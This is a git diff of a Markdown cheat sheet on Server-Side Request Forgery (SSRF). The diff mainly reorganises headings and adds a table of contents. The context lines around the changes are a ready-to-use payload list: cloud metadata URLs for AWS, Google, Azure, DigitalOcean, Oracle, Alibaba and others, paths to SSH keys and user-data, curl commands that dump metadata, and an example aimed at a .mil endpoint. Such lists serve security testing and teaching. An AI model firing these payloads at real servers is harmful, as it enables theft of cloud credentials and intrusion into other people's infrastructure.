@@ -1,6 +1,23 @@
 # Server-Side Request Forgery
 Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on behalf of him.
 
+## Summary
+* [Exploit with localhost]()
+* [Bypassing filters]()
+* [SSRF via URL Scheme]()
+* [SSRF to XSS]()
+* [SSRF URL for Cloud Instances]()
+  * [SSRF URL for AWS Bucket]()
+  * [SSRF URL for Google Cloud]()
+  * [SSRF URL for Digital Ocean]()
+  * [SSRF URL for Packetcloud]()
+  * [SSRF URL for Azure]()
+  * [SSRF URL for OpenStack/RackSpace]()
+  * [SSRF URL for HP Helion]()
+  * [SSRF URL for Oracle Cloud]()
+  * [SSRF URL for Alibaba]()
+
+
 ## Exploit with localhost
 
 Basic SSRF v1
@@ -203,8 +220,9 @@ https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brut
 ```
 
 
-
-## SSRF on AWS Bucket - [Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)
+## SSRF URL for Cloud Instances
+### SSRF URL for AWS Bucket
+[Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)
 Interesting path to look for at http://169.254.169.254
 ```
 Always here : /latest/meta-data/{hostname,public-ipv4,...}
@@ -253,7 +271,7 @@ http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
 http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
 ```
 
-## SSRF URL for Google Cloud
+### SSRF URL for Google Cloud
 Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"
 ```
 http://169.254.169.254/computeMetadata/v1/
@@ -275,7 +293,7 @@ http://metadata.google.internal/computeMetadata/v1beta1/
 ```
 
 
-## SSRF URL for Digital Ocean
+### SSRF URL for Digital Ocean
 https://developers.digitalocean.com/documentation/metadata/
 ```powershell
 curl http://169.254.169.254/metadata/v1/id
@@ -291,12 +309,12 @@ All in one request:
 curl http://169.254.169.254/metadata/v1.json | jq
 ```
 
-## SSRF URL for Packetcloud
+### SSRF URL for Packetcloud
 ```
 https://metadata.packet.net/userdata
 ```
 
-## SSRF URL for Azure
+### SSRF URL for Azure
 Limited, maybe more exist? https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
 ```
 http://169.254.169.254/metadata/v1/maintenance
@@ -308,19 +326,19 @@ http://169.254.169.254/metadata/instance?api-version=2017-04-02
 http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
 ```
 
-## SSRF URL for OpenStack/RackSpace 
+### SSRF URL for OpenStack/RackSpace 
 (header required? unknown)
 ```
 http://169.254.169.254/openstack
 ```
 
-## SSRF URL for HP Helion 
+### SSRF URL for HP Helion 
 (header required? unknown)
 ```
 http://169.254.169.254/2009-04-04/meta-data/ 
 ```
 
-## SSRF URL for Oracle Cloud
+### SSRF URL for Oracle Cloud
 ```
 http://192.0.0.192/latest/
 http://192.0.0.192/latest/user-data/
@@ -328,7 +346,7 @@ http://192.0.0.192/latest/meta-data/
 http://192.0.0.192/latest/attributes/
 ```
 
-## SSRF URL for Alibaba
+### SSRF URL for Alibaba
 ```
 http://100.100.100.200/latest/meta-data/
 http://100.100.100.200/latest/meta-data/instance-id
